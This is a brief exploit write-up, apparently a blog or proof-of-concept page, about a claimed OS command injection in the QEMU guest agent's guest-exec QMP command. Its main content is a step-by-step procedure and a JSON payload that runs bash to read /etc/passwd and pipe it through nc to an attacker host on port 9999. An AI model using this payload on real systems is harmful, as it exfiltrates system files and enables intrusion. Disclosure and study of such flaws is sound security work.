# Overview
The QMP **guest_exec** command in QEMU 4.0.0 and earlier is prone to OS command injection, which allows the attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.

1st, execute the QEMU Guest Agent service
2nd, open another console and setup a listener to port 9999
3rd, connect to the target and enter the following commands:

{% highlight json %}
{'execute':'guest-exec','arguments':{'path':'/bin/bash','arg': ['-c', 'cat /etc/passwd | nc <attacker_ip> 9999']}}
{% endhighlight %}
